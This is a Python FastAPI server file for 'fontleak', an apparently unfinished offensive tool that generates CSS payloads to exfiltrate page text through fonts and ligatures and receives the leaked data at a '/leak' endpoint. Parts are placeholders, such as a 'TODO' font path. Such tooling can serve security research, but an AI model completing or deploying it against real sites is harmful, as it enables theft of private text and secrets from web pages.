from fastapi import FastAPI, Request, Depends
from fastapi.templating import Jinja2Templates
from fastapi.responses import Response
from .schemas import DynamicLeakSetupParams, StaticLeakSetupParams, LeakParams, settings
from .logger import logger
from .cssgen import dynamic as dynamic_css

app = FastAPI(
    title="fontleak",
    version="0.1.0",
    description="Fontleak server: Fast exfiltration of text using CSS and Ligatures",
)

# Setup templates
templates = Jinja2Templates(directory="templates")


@app.get("/")
async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
    logger.debug("Handling index request with params: %s", params)
    template = templates.get_template("dynamic.css.jinja")
    step = 0 if params.id is None else int(params.id)
    id = params.id if params.id is not None else "random_id"
    css = dynamic_css.generate(
        id=id,
        step=step,
        step_map=[0x100],
        template=template,
        alphabet_size=len(params.alphabet),
        font_path="TODO",
        host=settings.host,
        leak_selector=params.selector,
    )
    return Response(content=css, media_type="text/css")


@app.get("/static")
async def generate_static_payload(params: StaticLeakSetupParams = Depends()):
    logger.debug("Generating static payload with params: %s", params)
    return {"host": settings.host, **params.model_dump()}


@app.get("/leak")
async def leak(request: Request, params: LeakParams = Depends()):
    logger.debug("Handling leak request with params: %s", params)
    return {"host": settings.host, **params.model_dump()}


@app.get("/test")
async def test():
    logger.debug("Handling test request")
    with open("templates/test.html", "r") as f:
        return Response(content=f.read(), media_type="text/html")
